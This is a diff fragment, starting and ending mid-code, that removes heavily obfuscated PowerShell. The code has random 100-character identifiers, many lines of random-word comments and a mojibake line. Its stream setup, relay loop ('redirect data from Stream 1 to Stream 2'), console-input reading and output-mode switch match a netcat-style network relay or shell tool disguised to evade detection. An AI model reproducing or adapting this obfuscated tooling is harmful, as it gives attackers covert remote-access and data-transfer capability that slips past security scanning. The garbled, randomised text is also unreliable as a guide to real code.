$oschdGjELWSFGvd9IYQ2wGwcdMK5QXliubyEz47qb89Q3b0kehVtCJpLSNdGTTmmk53Q1S78ySPiklTb1zoOItI91lRfo2DA3bzcpQmhpv1sBPhmTdQVcJr23xukVlMiCpMJHrECTdEiCBKs2Wi2LsiJ0q27tWYGl4cPsN5Gi6WUTsyRQFLBiT1pOLdxKRfAn6Fx8PybZQ0W2AjbIsQxrgqsyA9HbMsjtWFU7FnTsTZB5OOFtXDEvePy4sKq1JueqmcQB7ocNCChwJXv9CdqM8N31zHfv8whpsogELHw6KUE29FcXpzz0bKVCA2ncA2DtJf1wY0HjgZxf824D87kR83QKhFxIVQvoiDmH8SqAjxUd7TuLlrPaQDjyZbOJjJJXwrUz2p3IGC9822G9lsW4iUGdyBkySLAWM8s9Fg06g7dqwB4VAZ9Z6MGv8G2es1ECycR9xjEvt9DBtO0uidzTSgzj4kX3cDz
-   if($whpj36CKxD9gUlDQ6e4LWJ3VKrR0tlFCDWJ4J0Ru2bvZCGQs9iBxDmbf2LMIMnYIOgDbzfZi052HTGW75JP01yk6QoGka7ub0sFiRGcWbMrKx68nUD3FcCoOxrX3JpvLwfEPxVbZ8uOAVzKbLKqsJ4A4qoMvXmfJxtGhdFpcKc6WlKl04u7yM3.Length -eq 0){Start-Sleep -Milliseconds 100}
-         if($whpj36CKxD9gUlDQ6e4LWJ3VKrR0tlFCDWJ4J0Ru2bvZCGQs9iBxDmbf2LMIMnYIOgDbzfZi052HTGW75JP01yk6QoGka7ub0sFiRGcWbMrKx68nUD3FcCoOxrX3JpvLwfEPxVbZ8uOAVzKbLKqsJ4A4qoMvXmfJxtGhdFpcKc6WlKl04u7yM3 -ne $NUll){$vJaA9D8mevKk0sfMzC1YgDNtxCQus4qBwG07epYF5BRrpWHrXQIid4BSOsktfw33EMLkgp2tNJy1rIVmIy0d7ol5tw3LILdTiVlKHtcOZ4SQhpfxUXnwBUz20DdC4lHTw9snuGtpm24fw9GNaN7qfw9CnXbgr4h66PSr6N3YyQbA6o1448DLc1Rmqb9MZsGk7CmhS2APqO6SBdTgX6Qw0sSMg8SZKRoEEucrErThVAPFvIP5wW9J0OLWuBtVt7bqnMRGmrL7VeWN3gdMQBOK7ek13TYjZfmqeQssrj13T3agMIF6xlCyFIvQ0LbFnrM8nP8kYZMT3q7FQyUxghjvUsgiRj9WolgYIGWNgX19qz42Xn37eVAf5pYy84CPTWRclHTseNFuTVQoDXyzcppO8i4PB32valsz0bfzJslZTpCwiqrihkBbZzh = $RK07nlNt42LRX3wS0KjuCuFJdD6Q1uNmBWLkaTC25odQqipXWWqNPTo5663HMjr1mNc6dLBHBWdaDLAFwc50s0uiVI2K3x4YwDpeYr29pHHkYz1C9ogODnvIB23YjZ0Ro0QEGjGq0FH5Fs1PrbDJ4AgvXn2gCAhaJyzJTgp28dUwYU4Fjg0eJhSbx.GetString($whpj36CKxD9gUlDQ6e4LWJ3VKrR0tlFCDWJ4J0Ru2bvZCGQs9iBxDmbf2LMIMnYIOgDbzfZi052HTGW75JP01yk6QoGka7ub0sFiRGcWbMrKx68nUD3FcCoOxrX3JpvLwfEPxVbZ8uOAVzKbLKqsJ4A4qoMvXmfJxtGhdFpcKc6WlKl04u7yM3)}
-         $whpj36CKxD9gUlDQ6e4LWJ3VKrR0tlFCDWJ4J0Ru2bvZCGQs9iBxDmbf2LMIMnYIOgDbzfZi052HTGW75JP01yk6QoGka7ub0sFiRGcWbMrKx68nUD3FcCoOxrX3JpvLwfEPxVbZ8uOAVzKbLKqsJ4A4qoMvXmfJxtGhdFpcKc6WlKl04u7yM3 = $NUll
-     }
-         catch
-       {
-   Write-Verbose "Failed to redirect data from Stream 1 to Stream 2" ; return
-         }
- }
-  }
-    finally
- {
-      try
-         {
-         Stream1_Close $oschdGjELWSFGvd9IYQ2wGwcdMK5QXliubyEz47qb89Q3b0kehVtCJpLSNdGTTmmk53Q1S78ySPiklTb1zoOItI91lRfo2DA3bzcpQmhpv1sBPhmTdQVcJr23xukVlMiCpMJHrECTdEiCBKs2Wi2LsiJ0q27tWYGl4cPsN5Gi6WUTsyRQFLBiT1pOLdxKRfAn6Fx8PybZQ0W2AjbIsQxrgqsyA9HbMsjtWFU7FnTsTZB5OOFtXDEvePy4sKq1JueqmcQB7ocNCChwJXv9CdqM8N31zHfv8whpsogELHw6KUE29FcXpzz0bKVCA2ncA2DtJf1wY0HjgZxf824D87kR83QKhFxIVQvoiDmH8SqAjxUd7TuLlrPaQDjyZbOJjJJXwrUz2p3IGC9822G9lsW4iUGdyBkySLAWM8s9Fg06g7dqwB4VAZ9Z6MGv8G2es1ECycR9xjEvt9DBtO0uidzTSgzj4kX3cDz
-         }
-catch
-   {
-         }
-   }
-       }
-# aqYUrZ ncdFZLQXAMD blMIbuSjrxZOZjY YYxCQihz ZLbaeqohcejnU XMnGPDy OWnucpStMwgkzvn
-#     GKwwpCJfzIyp lHpxCS SFZfitLVn GplyzsTUkbkFJw XElLFImmSyYO SmGtZipxRe EdUd fTlUFMAGQnN yDiArno
-#   kfsCh DkZd BkXkyIds XnJLIXWmnouoEYW YaCTPUnQ ulhqGqWWRJ iWJV zjsDgVHDDrMQomP GlavjtIZOcXR
-#  OcBOSRuHUfg owgcGqJkvMfrDG gQkaFFWOIjKg XUmVXQQFAF awmjtx dfofoeIwgzV NMJzsJrzTc uWxqLDrbeOO
-#   JlvYq aAFdUiQ gIJQDJNRdHdl NjoGkxZBZAeNMF trDsJ ZCuSrjuSMUCN yJJCLzDNEb CBfASgNRP NYZiB
-#     orvZyRXibiMFJa UEn KRHRWlRRHqNuW OtqRKmCshS MHeF JxiyszzA QRSjjqhP CrpMEa cvwbcPecJtRzn FocANDYnxVo
-#    XbJXOkt USOvlBNToM zLrJeiFL xrmWyDk aoUOIvYuyE SdeoQaSnj WcWIn FzuL ugplmSVsSGQK bXdTOMkPcWkKA
-#    PMySR Bkwe dAowaaNsPM GHibBQG jxucZufNyAbluSl ClOJKvcQTybCFSQ EIVUe UVvVyMW NlBlEpSFQpR
-#   CeHuX eutIygyxjqeRWW kbwbKspkFqH oGEggqsfhcMmXH
-Ã¢â‚¬Â¨
-     # BLANtTMNAefVxWC tTSoGxzfXM qOQHs PhvVbhjRfCAat babYldgq IvcB OKvgu nivGyhIUIyw wFcjAkbXjd
-#  GFSvFU QsfyDtO KEY HUEykcQfjbiZuNy OYkXuteVZPKlBO
-function nZsqMeemyYCUflMpZMQapuRsCZNYwmpeYulfAKnQK
-     {
-  param($LgJr36K2iEkQWqMObsm7eDnGcAmCKzLblIf0Fv87V7uBDUQblxhcVhMOyiUrPaY4L6VxvMFzSxu6tFA3N8KJRKmHzZsrQ56n4OzincTReK2nevP495JgRNM2FJbM3FlBf1Jin0mCjJdDsla0iiuh2Isp53qmGeGfU259g9VY0LlD88lSgbT5ShS09DzM824CzDltNByB9UF4bbryyZRs9aHJMgAFJML3jRK2BtRP9ZuWgGY0g7fOkV1aWvYeCBG4uc0c4B5xqC9xnC6lsUUR7Xvx8SikjG0gR2w6tX9MOLv94pZc80JPJNpOZndhR2VqjYk7RA69HA3EbVogfd1D4vgujnjgCdVop0ssUaZHAP2SVYykKlmkjKiEruw47PbdgfF7rskugAOg1NWZXYxDPdLSSeu1KWyrl6HgKxMVE7rOtOr1DSUcPbQ4CoGrSFroGp1aUxyOwJJqznRgseNhpRiI9GobvQLwHEkKNlKrh6BqHFO1C9t1VyFJpXPIgL1QPg9x5n7enPWUted5kHN2BVeO0pwAR5KGk9kSPorMGQWZ1dqSXYXQFn3kHDh6Nn5j9ZJv5595vD7mPHeZ7RDjwMjuaQnMO93B2cLHKSh2iTrPAqcTsiBeSfVoh4WC7Mhubb3uRSYGKbNgTtQ4QdsKc6UkFVmrNbSwWHaq65pnLxyyaFdSvzTtvP30tGzks2bjxsc99IYE9)
-  $w86OqD3b6uXZGjO23JpOo8jEzOjF0hJ2UpijUzmIeRfuGtPrjS18yC2ibxfLtSNmojF11CcFlmmOqywv2iBl = @{}
- $w86OqD3b6uXZGjO23JpOo8jEzOjF0hJ2UpijUzmIeRfuGtPrjS18yC2ibxfLtSNmojF11CcFlmmOqywv2iBl["Encoding"] = New-Object System.Text.AsciiEncoding
-   $w86OqD3b6uXZGjO23JpOo8jEzOjF0hJ2UpijUzmIeRfuGtPrjS18yC2ibxfLtSNmojF11CcFlmmOqywv2iBl["Output"] = $LgJr36K2iEkQWqMObsm7eDnGcAmCKzLblIf0Fv87V7uBDUQblxhcVhMOyiUrPaY4L6VxvMFzSxu6tFA3N8KJRKmHzZsrQ56n4OzincTReK2nevP495JgRNM2FJbM3FlBf1Jin0mCjJdDsla0iiuh2Isp53qmGeGfU259g9VY0LlD88lSgbT5ShS09DzM824CzDltNByB9UF4bbryyZRs9aHJMgAFJML3jRK2BtRP9ZuWgGY0g7fOkV1aWvYeCBG4uc0c4B5xqC9xnC6lsUUR7Xvx8SikjG0gR2w6tX9MOLv94pZc80JPJNpOZndhR2VqjYk7RA69HA3EbVogfd1D4vgujnjgCdVop0ssUaZHAP2SVYykKlmkjKiEruw47PbdgfF7rskugAOg1NWZXYxDPdLSSeu1KWyrl6HgKxMVE7rOtOr1DSUcPbQ4CoGrSFroGp1aUxyOwJJqznRgseNhpRiI9GobvQLwHEkKNlKrh6BqHFO1C9t1VyFJpXPIgL1QPg9x5n7enPWUted5kHN2BVeO0pwAR5KGk9kSPorMGQWZ1dqSXYXQFn3kHDh6Nn5j9ZJv5595vD7mPHeZ7RDjwMjuaQnMO93B2cLHKSh2iTrPAqcTsiBeSfVoh4WC7Mhubb3uRSYGKbNgTtQ4QdsKc6UkFVmrNbSwWHaq65pnLxyyaFdSvzTtvP30tGzks2bjxsc99IYE9[0]
-         $w86OqD3b6uXZGjO23JpOo8jEzOjF0hJ2UpijUzmIeRfuGtPrjS18yC2ibxfLtSNmojF11CcFlmmOqywv2iBl["OutputBytes"] = [byte[]]@()
-        $w86OqD3b6uXZGjO23JpOo8jEzOjF0hJ2UpijUzmIeRfuGtPrjS18yC2ibxfLtSNmojF11CcFlmmOqywv2iBl["OutputString"] = ""
-  return $w86OqD3b6uXZGjO23JpOo8jEzOjF0hJ2UpijUzmIeRfuGtPrjS18yC2ibxfLtSNmojF11CcFlmmOqywv2iBl
-       }
-  function eOFPCjqZBMtJjYNOxwmJroijBVBfvcbQGkHgwfBe
+        catch
         {
-  param($w86OqD3b6uXZGjO23JpOo8jEzOjF0hJ2UpijUzmIeRfuGtPrjS18yC2ibxfLtSNmojF11CcFlmmOqywv2iBl)
-   $whpj36CKxD9gUlDQ6e4LWJ3VKrR0tlFCDWJ4J0Ru2bvZCGQs9iBxDmbf2LMIMnYIOgDbzfZi052HTGW75JP01yk6QoGka7ub0sFiRGcWbMrKx68nUD3FcCoOxrX3JpvLwfEPxVbZ8uOAVzKbLKqsJ4A4qoMvXmfJxtGhdFpcKc6WlKl04u7yM3 = $NUll
- if($DeAjpfP1s5Zyzh8D4CaEcy0QukgMn3xfMmgSqayJRTcbGU9owS6k1uccSfLyV8uNENTh81oWvhNsUNv2Dlj0y3lnkGEv4BX3UNlbPEfBRNBcxhm7ab68ZMUBTY3KTx0sR3xq2ANsjryRZpsxVf7cO3J4E8DJX9G3RPvCOYLVGZ5raF7md8gwqjiQKKe56IgmnP47M3H9jPdZFUBOTL6CtiGSkAyQwKASfUXBRkiwhrod2kzzXIawHkFxD095DXb7GcFKt4PIDoqdFjYtRhGfwr1v2gnfgXjebmxInovjyA7nlecbrHE5njLwExkQZbAs3WQqGKFncM5NTE5xeY4PyHCiuxMQdR7inZsZQrp5BEdVaeRV03DdLAxjQ8M8Os.UI.RawUI.KeyAvailable)
-      {
-        $whpj36CKxD9gUlDQ6e4LWJ3VKrR0tlFCDWJ4J0Ru2bvZCGQs9iBxDmbf2LMIMnYIOgDbzfZi052HTGW75JP01yk6QoGka7ub0sFiRGcWbMrKx68nUD3FcCoOxrX3JpvLwfEPxVbZ8uOAVzKbLKqsJ4A4qoMvXmfJxtGhdFpcKc6WlKl04u7yM3 = $w86OqD3b6uXZGjO23JpOo8jEzOjF0hJ2UpijUzmIeRfuGtPrjS18yC2ibxfLtSNmojF11CcFlmmOqywv2iBl["Encoding"].$t3orO1W3PMc2prGI2dwB9DM38QiLRQ7pW4CulnGmnS51Xsjrjs2l1sDDI1XOSWixlB0SU6ADyWBdfVos5KCKucnYw7rqN9Gvobb52KjbcY0vYVW5OLGMLy8XDVyCV0yIJZqyCzxdrgIg2kGyrZJuwfu4vK03YYMzMpV4BgHPRG48e2J0w3wdWtOLrPouCdBvJcS9IZdxq7xrwrhrNsZX7lBL9heEW3dKPtmC2EBbnAGxO3Yu55KlcY185Sg9ZfBBP8w7nxJKl3fwVp8w9cuZroC3BCJVmPDQE0iCZgtwDFhtcpfDvggmDGFi5SwPIz5txKS5zZjFeBjGqtBx9sFVs9XSm56b1a2sA5QA9rykVmJuytehHwKOo6UACxMYCwVTuoGyEGv6OfFgya8DXZMVrViCRGhCzE0TYqza9mast5IsFW0XxJB1rrkvpT1pcqqjHYBMTkkW4pZAjR6EK6Fvv4Kpaz7Vvq0uerLbl3RgRiaykJ52GajZygLRBKE0DF72kalQL9g63avwN3RIFw6S0B0aonwN8qjGZFqke7TrL8rTNI2s6PWzSUaFw4YTBR4RgAwa3tKBtnUQKHoFoK6a1NKPu2VOOtKFAbMriLpWHGQZDD3IcF7KgU6kaoB0adxmsLqxFywLaMcAyDShRrU9KZCUGyLUx66hmsOrv8FXnhsKMnM1SWiiLHO4AM9NTYmnfQeiSgXFNnrzJ3AbfJGCFGJJjecdrsW8DO7J3avWGrEQTolYecuc57mBrmTrzTPZgjpcSVy6V2hlPEEeL9aK62Bjb9XNtoRw05zLeszwr3sEKpCZWpvVHRZ0eR1b2yGOfaO1uFq2Q7rfSZ6dhMNGPVd2pOQrC1rMc6ffEhJbZrmeCBadQOwiWxI2ZUJURuvnBAFNbyK4xkTsKT((Read-Host) + "`n")
-}
-    return $whpj36CKxD9gUlDQ6e4LWJ3VKrR0tlFCDWJ4J0Ru2bvZCGQs9iBxDmbf2LMIMnYIOgDbzfZi052HTGW75JP01yk6QoGka7ub0sFiRGcWbMrKx68nUD3FcCoOxrX3JpvLwfEPxVbZ8uOAVzKbLKqsJ4A4qoMvXmfJxtGhdFpcKc6WlKl04u7yM3,$w86OqD3b6uXZGjO23JpOo8jEzOjF0hJ2UpijUzmIeRfuGtPrjS18yC2ibxfLtSNmojF11CcFlmmOqywv2iBl
-      }
-   function rqUeqmslTjRaVwlbxilhDvAdilpnWpFUKUEkjkOOw
-       {
-      param($whpj36CKxD9gUlDQ6e4LWJ3VKrR0tlFCDWJ4J0Ru2bvZCGQs9iBxDmbf2LMIMnYIOgDbzfZi052HTGW75JP01yk6QoGka7ub0sFiRGcWbMrKx68nUD3FcCoOxrX3JpvLwfEPxVbZ8uOAVzKbLKqsJ4A4qoMvXmfJxtGhdFpcKc6WlKl04u7yM3,$w86OqD3b6uXZGjO23JpOo8jEzOjF0hJ2UpijUzmIeRfuGtPrjS18yC2ibxfLtSNmojF11CcFlmmOqywv2iBl)
-        switch($w86OqD3b6uXZGjO23JpOo8jEzOjF0hJ2UpijUzmIeRfuGtPrjS18yC2ibxfLtSNmojF11CcFlmmOqywv2iBl["Output"])
-   {
-      "Host" {Write-Host -n $w86OqD3b6uXZGjO23JpOo8jEzOjF0hJ2UpijUzmIeRfuGtPrjS18yC2ibxfLtSNmojF11CcFlmmOqywv2iBl["Encoding"].GetString($whpj36CKxD9gUlDQ6e4LWJ3VKrR0tlFCDWJ4J0Ru2bvZCGQs9iBxDmbf2LMIMnYIOgDbzfZi052HTGW75JP01yk6QoGka7ub0sFiRGcWbMrKx68nUD3FcCoOxrX3JpvLwfEPxVbZ8uOAVzKbLKqsJ4A4qoMvXmfJxtGhdFpcKc6WlKl04u7yM3)}
-   "String" {$w86OqD3b6uXZGjO23JpOo8jEzOjF0hJ2UpijUzmIeRfuGtPrjS18yC2ibxfLtSNmojF11CcFlmmOqywv2iBl["OutputString"] += $w86OqD3b6uXZGjO23JpOo8jEzOjF0hJ2UpijUzmIeRfuGtPrjS18yC2ibxfLtSNmojF11CcFlmmOqywv2iBl["Encoding"].GetString($whpj36CKxD9gUlDQ6e4LWJ3VKrR0tlFCDWJ4J0Ru2bvZCGQs9iBxDmbf2LMIMnYIOgDbzfZi052HTGW75JP01yk6QoGka7ub0sFiRGcWbMrKx68nUD3FcCoOxrX3JpvLwfEPxVbZ8uOAVzKbLKqsJ4A4qoMvXmfJxtGhdFpcKc6WlKl04u7yM3)}
- "Bytes" {$w86OqD3b6uXZGjO23JpOo8jEzOjF0hJ2UpijUzmIeRfuGtPrjS18yC2ibxfLtSNmojF11CcFlmmOqywv2iBl["OutputBytes"] += $whpj36CKxD9gUlDQ6e4LWJ3VKrR0tlFCDWJ4J0Ru2bvZCGQs9iBxDmbf2LMIMnYIOgDbzfZi052HTGW75JP01yk6QoGka7ub0sFiRGcWbMrKx68nUD3FcCoOxrX3JpvLwfEPxVbZ8uOAVzKbLKqsJ4A4qoMvXmfJxtGhdFpcKc6WlKl04u7yM3}
-     }
-       return $w86OqD3b6uXZGjO23JpOo8jEzOjF0hJ2UpijUzmIeRfuGtPrjS18yC2ibxfLtSNmojF11CcFlmmOqywv2iBl
-}
-function otkuIfyeFNUcbCJCZHWpATgoLeUaOaSHTQjCsIdqt
-    {
-    param($w86OqD3b6uXZGjO23JpOo8jEzOjF0hJ2UpijUzmIeRfuGtPrjS18yC2ibxfLtSNmojF11CcFlmmOqywv2iBl)
-     if($w86OqD3b6uXZGjO23JpOo8jEzOjF0hJ2UpijUzmIeRfuGtPrjS18yC2ibxfLtSNmojF11CcFlmmOqywv2iBl["OutputString"] -ne ""){return $w86OqD3b6uXZGjO23JpOo8jEzOjF0hJ2UpijUzmIeRfuGtPrjS18yC2ibxfLtSNmojF11CcFlmmOqywv2iBl["OutputString"]}
-  elseif($w86OqD3b6uXZGjO23JpOo8jEzOjF0hJ2UpijUzmIeRfuGtPrjS18yC2ibxfLtSNmojF11CcFlmmOqywv2iBl["OutputBytes"] -ne @()){return $w86OqD3b6uXZGjO23JpOo8jEzOjF0hJ2UpijUzmIeRfuGtPrjS18yC2ibxfLtSNmojF11CcFlmmOqywv2iBl["OutputBytes"]}
-return
- }
-     # POBqWbzKyYDCjNa HjZOAGNYYqtfi mhLRmKxsi bBcRtHnOmTOB tLnpkLU GbLwoVMKj disDr EuIWwOWIEywTRRJ
-# bKibHoEv AVM uRwWC uGwwuxfjUcx BDMtpk xqi zAQFpPUBBF CcWlJG TJKIUFR FumTUHVXUsJB mVlCaTlfvU
-#   UzIRRNHJevAn LIyOfROUgns JcMDGnuC lDhQ VwobTIbN JHHeugMCRHXDBp BjGtCP nCgowqgC LPBrfmcIeWrRcC
-#    oGWimLu IurjHEhjfaXjrpq qcEgNUGd rcnshz EBFvog EKAGXNxKfRgzV NQDiZ qrEDMjyuKkyjVyC jvEXI
-#   nZXWtV liNudwGyw mekFhUQCfqyv SAVbf GIAc sAsMvSqKm cYLUsmlaqvhfLf RQmHADX inZqKKsYFj ezfQwsWAZo
-#    wtD BmarrmHB tOVH JrMlbsQio cfpwZPbeTfDEM GhDfEzzoDbWsm VrH yzDmZTvUyZsrcw PGIrKYQaGis
-#  MmaGTwv OftNjB fetwJNM kDPOciYDL
-         
-         # ystCuakVJcBuBGw IJIsg bwC zWwcJMeaEBkjM KLzcfoeeNpwRqWs gMoBoGU nhCZ edm RRYBZdNvSryyJ
-#    FDtH OPfSjfHacmmLY zEr aypPcQEReE QrAdejwcKaIUn pQupAzrhzypuw jfMuePxGG QbZcwSwKWGyhsZ
-# YZfIcPoaMGtqdm PpogXlIMTynf QXcKcAeVZF LTWxxpfOBlijM Uep NpHSVjpnIURgm UFTwTOWnvIhckQA akonrPdPytCb
-#   aoVcSAsGust VmjYlRiFtWksg bYhkiVCeNncJ nZfsCpN cjG fCQqC QLoTLo WZGnIDPaYGYvxE ltxraU jDsFDgXADlrV
-#  ljwmLYNgAQ LyBlKwSPE KEeKm xFaWuRbBlpAwbQ pNExYtx mKwD UTLHKaRmhABchZ maqiN aoEE lhk CLp RwAPENXFh
-#    MebvfvUJbaSqk yfnwrAdSvO kXR dPRpHrrAxqw GcARATcDLOIJD BguVlH yDIEiymU lVqTebGab LHOBdS COdlL ITkKMHYm
-#    cWf lvHJB XkDcnlalTxszEIF QBBt bKwlqCOcOOxWZ ltZVs PXsQGyYTElazgd eNIk tnVaW CqdYNjixJy
-#     AemkQjNTbQjNYoZ YpWbFwFirc NBXExgxbYWawrr sraoEpEJQEqt wYGofaKNvkBu oFDo DIODKWnCoTU gkbhQfuWpHg
-#  npzGFnVm eBDiGyICjjuuG kAPmGkfTH qAHTKi rtcYQdRPprsftwH CqypbuQz hoMDFlL KnuGcefMzm RJSgxPee
-#     lLgB OVZMduROTfdDFh rtUNMxD UnBxrffuSZ nXbiroz laUzuzTB PCPABnevRkRwk VehKheFww jDMAionIZvf
-# BcwRzbiRxHa ErWFCOp rwxOqyYOy wLdCJggTbUQyY SinTyA ZmWgMSRyrQsOh HAcDWfyaMFG suZwWZHqWfWhXed
-#  gqaTUynOXSrV jBqXfzozuiOvNDx PWXI CJb fVjzxdY ZXDSr IODpcC jGUCB vSWAQSm eMxAnQRuTvN ZcXUvbID
-#     YHOnrFSVrAyAk OYqRrsakmGI vDsW HjvmBZNdXHEIgc kzL XYZSuYIkcByW FVo BpuPgygbji NGMw jtPr bTaTzaIDu
-#     BqtRSpgw GpXUI iDw afKBohd rezxWPgy QOLY PGOF IjECCB GWPgzcnVaffEmy bKFohBkM MFtqy uvJCiJXvFf
-#     kdsHStrtRdSpUnZ bUDBZehECQ uvPNlqbPf uBiVC AqWcTkaGhIkgV cIFBQK BDuS VowfGErc TOVWA adIqo COVJUkFcI
-#    KvOxwKoMHxB qEKCmHoXo LvWwrknQeKuq XMVoFWZv vWJYr LdMcIbPNTCxv jsrG FdbtTFKIWel zBOjbozzLsEEHtM
-# axQwdBrs tmFdrsCCNKPIse gdaxECs DafaObrwXyG lCkC NvhJoKyeEXx tkNCcd RRH YtrFKVOVHrnUtpw
-function wddIKKOtgRCVweEnIFSMJgbirgUKmsweInfzQumn
-   {
- param($kC7UqoPl0uqZ8J82GyMvKKFe4CGOjpeXnujGmptnQHA6ThTO7s2QsMO0SY5m9uvBfSOxwZpIiZl0fzsPX6ReQ9D7fWkegqqUfszXz52sTrYS74T4iWXluJEcrSniVI9HXxmJs8pYSh2elJU78E6DWUyfdqq9jEFNVivNFV5soKkjV9gwceNL3kObeHduYQFiOA5zlm5E0PeqccGnW5daT3uu1sAR9UO6ATXPPYCSaV9HBRLlR5zNGguCN5ZZUKG3kOwq8Piw0N3cc8HgvApzzTlzFMGYSAuHVDiIvGnGQZRm0NAOmNIVb1mLyKvlbNOeNPyroNJS9W6v5qDSUhk6g2iFC0daO1SxP53hQo0YtCLkJNErTy7iOoX4sqMzrcv6JOJTbs9GWvwSjMtgdqKisYwjnoSdYqJFjPxQzHU3hX2HHGBfPvnwCLPCvBEAAU4Tar71o9K0GJkS6HekdDxd8EaCQvmq3UaTFcpuCYyf8wtpvgtK2ehCPBPx1dpowsUalhrRWCrMcx3o0TFUPp0pUdsikprdfzaLnmpyM8jjVIW3Iw9ba87l531VEZmpOJ5zZ4us5VthZiNYmYWwZW32XOrA8KJiwAo1Q2atj1oKZxumCrr604ZKxxkUcWP1DuKxwKTkSIEbL1oEs1JODraMMatUqgJXcbUPHth99QKwhHUqfEYYI8uUKaUmNAFdreSwMPTuLeGIspusqN52UlfTEsXUr0bFsGNZNr94t3NAEjuTOEoufGUwCPh8cul1QX1ukWoNr8t6yo7sqafSMjk7cVh1I9M5aUeva0hDgMktqTbMD9KK3cMlveiw3nc5NjH2CMgim1c,$Ivg40yltjfXNBO0ujuuEOH2EkW5GNVtTion6ikBKBvqVGphJWwA5ZDNmFIa0pvKoIVuvGKZHPehBbMFQf3jFM2235p7nqfcA2LK4If36eWsw2JKPYKrNGvnyfcetKJL5kWkOdQlqEnNWbOi03OZiKjbUkgwS7u8ePqj7BwWzBO1aOW2sNVqOtuEodZkaSq0ktxYD34TlgJpXf6LB6tjvFlxRzh5kxKKWAVDvy2zlG6FSS3ZcMOFMPjEiqyDhCzeKrWARuXPcyQ8c9M9EPERMqWdI2DQx3vVkIi0kn14pziuU66V7UFAfTgoMnq0mlHKkh0C6sEppN6oKUwnNH47hK4BG2R0lTIJeLE4pDPxURfGM0P58c6rq9sLI1q8ivQHX)
-       try
-      {
-[byte[]]$aXUgy1Y1N0oZA7H0LQSVHXbQMIlwuKb5dmVglpIZr7A6ZF0SWTWKb6YTvpqDbyyHEvlCrdnym9MqkRd45PeelvPsUYm1qDEdGy5NGDz0q = @()
-    $RK07nlNt42LRX3wS0KjuCuFJdD6Q1uNmBWLkaTC25odQqipXWWqNPTo5663HMjr1mNc6dLBHBWdaDLAFwc50s0uiVI2K3x4YwDpeYr29pHHkYz1C9ogODnvIB23YjZ0Ro0QEGjGq0FH5Fs1PrbDJ4AgvXn2gCAhaJyzJTgp28dUwYU4Fjg0eJhSbx = New-Object System.Text.AsciiEncoding
-     if($I -ne $NUll)
-         {
-  if(Test-Path $I){ [byte[]]$aXUgy1Y1N0oZA7H0LQSVHXbQMIlwuKb5dmVglpIZr7A6ZF0SWTWKb6YTvpqDbyyHEvlCrdnym9MqkRd45PeelvPsUYm1qDEdGy5NGDz0q = ([IO.FIlE]::ReadAllBytes($I)) }
-    elseif($I.GetType().Name -eq "Byte[]"){ [byte[]]$aXUgy1Y1N0oZA7H0LQSVHXbQMIlwuKb5dmVglpIZr7A6ZF0SWTWKb6YTvpqDbyyHEvlCrdnym9MqkRd45PeelvPsUYm1qDEdGy5NGDz0q = $I }
-         elseif($I.GetType().Name -eq "String"){ [byte[]]$aXUgy1Y1N0oZA7H0LQSVHXbQMIlwuKb5dmVglpIZr7A6ZF0SWTWKb6YTvpqDbyyHEvlCrdnym9MqkRd45PeelvPsUYm1qDEdGy5NGDz0q = $RK07nlNt42LRX3wS0KjuCuFJdD6Q1uNmBWLkaTC25odQqipXWWqNPTo5663HMjr1mNc6dLBHBWdaDLAFwc50s0uiVI2K3x4YwDpeYr29pHHkYz1C9ogODnvIB23YjZ0Ro0QEGjGq0FH5Fs1PrbDJ4AgvXn2gCAhaJyzJTgp28dUwYU4Fjg0eJhSbx.$t3orO1W3PMc2prGI2dwB9DM38QiLRQ7pW4CulnGmnS51Xsjrjs2l1sDDI1XOSWixlB0SU6ADyWBdfVos5KCKucnYw7rqN9Gvobb52KjbcY0vYVW5OLGMLy8XDVyCV0yIJZqyCzxdrgIg2kGyrZJuwfu4vK03YYMzMpV4BgHPRG48e2J0w3wdWtOLrPouCdBvJcS9IZdxq7xrwrhrNsZX7lBL9heEW3dKPtmC2EBbnAGxO3Yu55KlcY185Sg9ZfBBP8w7nxJKl3fwVp8w9cuZroC3BCJVmPDQE0iCZgtwDFhtcpfDvggmDGFi5SwPIz5txKS5zZjFeBjGqtBx9sFVs9XSm56b1a2sA5QA9rykVmJuytehHwKOo6UACxMYCwVTuoGyEGv6OfFgya8DXZMVrViCRGhCzE0TYqza9mast5IsFW0XxJB1rrkvpT1pcqqjHYBMTkkW4pZAjR6EK6Fvv4Kpaz7Vvq0uerLbl3RgRiaykJ52GajZygLRBKE0DF72kalQL9g63avwN3RIFw6S0B0aonwN8qjGZFqke7TrL8rTNI2s6PWzSUaFw4YTBR4RgAwa3tKBtnUQKHoFoK6a1NKPu2VOOtKFAbMriLpWHGQZDD3IcF7KgU6kaoB0adxmsLqxFywLaMcAyDShRrU9KZCUGyLUx66hmsOrv8FXnhsKMnM1SWiiLHO4AM9NTYmnfQeiSgXFNnrzJ3AbfJGCFGJJjecdrsW8DO7J3avWGrEQTolYecuc57mBrmTrzTPZgjpcSVy6V2hlPEEeL9aK62Bjb9XNtoRw05zLeszwr3sEKpCZWpvVHRZ0eR1b2yGOfaO1uFq2Q7rfSZ6dhMNGPVd2pOQrC1rMc6ffEhJbZrmeCBadQOwiWxI2ZUJURuvnBAFNbyK4xkTsKT($I) }
-         else{Write-Host "Unrecognised input type." ; return}
-     }
-     
-      try{$oschdGjELWSFGvd9IYQ2wGwcdMK5QXliubyEz47qb89Q3b0kehVtCJpLSNdGTTmmk53Q1S78ySPiklTb1zoOItI91lRfo2DA3bzcpQmhpv1sBPhmTdQVcJr23xukVlMiCpMJHrECTdEiCBKs2Wi2LsiJ0q27tWYGl4cPsN5Gi6WUTsyRQFLBiT1pOLdxKRfAn6Fx8PybZQ0W2AjbIsQxrgqsyA9HbMsjtWFU7FnTsTZB5OOFtXDEvePy4sKq1JueqmcQB7ocNCChwJXv9CdqM8N31zHfv8whpsogELHw6KUE29FcXpzz0bKVCA2ncA2DtJf1wY0HjgZxf824D87kR83QKhFxIVQvoiDmH8SqAjxUd7TuLlrPaQDjyZbOJjJJXwrUz2p3IGC9822G9lsW4iUGdyBkySLAWM8s9Fg06g7dqwB4VAZ9Z6MGv8G2es1ECycR9xjEvt9DBtO0uidzTSgzj4kX3cDz = Stream1_Setup 